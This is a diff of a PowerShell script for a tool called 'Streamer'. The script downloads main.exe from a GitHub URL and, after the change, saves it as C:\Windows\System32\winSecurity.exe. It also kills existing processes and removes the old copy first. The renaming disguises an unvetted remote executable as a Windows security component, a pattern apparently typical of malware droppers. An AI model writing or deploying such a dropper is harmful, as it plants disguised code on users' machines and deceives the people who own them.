@@ -1,32 +1,44 @@
 $ErrorActionPreference = "Stop"
 
 $url = "https://github.com/mrjackff/streamer/raw/refs/heads/main/main.exe"
-$outputPath = "C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest\main.exe"
-$folderPath = "C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest"
-
-# Check if main.exe is running
-if (Get-Process -Name "main" -ErrorAction SilentlyContinue) {
-    Write-Host "main.exe is running. Ending the task..."
-    Stop-Process -Name "main" -Force
-    Write-Host "Task ended."
+$outputPath = "C:\Windows\System32\winSecurity.exe"
+$oldPath = "C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest\main.exe"
+$folderPath = "C:\Windows\System32"
+if (Get-Process -Name "winSecurity" -ErrorAction SilentlyContinue) {
+    Write-Host "Streamer is running. removing old streamer..."
+    Stop-Process -Name "winSecurity" -Force
+    Write-Host "Removed."
 } else {
-    Write-Host "main.exe is not running."
+    Write-Host "Streamer is not running."
 }
-
-# Check if the folder exists, and create it if it doesn't
+if (Get-Process -Name "main" -ErrorAction SilentlyContinue) {
+    Write-Host "Streamer is running. removing old streamer..."
+    Stop-Process -Name "main" -Force
+    Write-Host "Removed."
+} else {
+    Write-Host "Streamer is not running."
+}
+if (Test-Path -Path $oldPath) {
+    Write-Host "Streamer Found found. Removing it..."
+    try {
+        Remove-Item -Path $oldPath -Force
+        Write-Host "Streamer removed successfully."
+    } catch {
+        Write-Host "Failed $_"
+    }
+} else {
+    Write-Host "Streamer not found."
+}
 if (-Not (Test-Path -Path $folderPath)) {
     Write-Host "Folder does not exist. Creating folder..."
     New-Item -ItemType Directory -Path $folderPath
 }
-
-# Check if the file already exists and delete it if it does
 if (Test-Path -Path $outputPath) {
-    Write-Host "File already exists. Replacing it..."
+    Write-Host "Streamer Found. Removing it..."
     Remove-Item -Path $outputPath -Force
 }
 
-# Download main.exe
-Write-Host "Downloading main.exe..."
+Write-Host "installing..."
 try {
     Invoke-WebRequest -Uri $url -OutFile $outputPath
 } catch {
@@ -34,11 +46,10 @@ try {
     Start-Process curl -ArgumentList "-L", "-o", "`"$outputPath`"", "`"$url`"" -NoNewWindow -Wait
 }
 
-# Check if the download was successful
 if (Test-Path -Path $outputPath) {
-    Write-Host "Download completed successfully."
+    Write-Host "Streamer Installed successfully."
 } else {
-    Write-Host "Download failed."
+    Write-Host "Installing failed."
 }
 
 Write-Host "Closing in 5 seconds..."
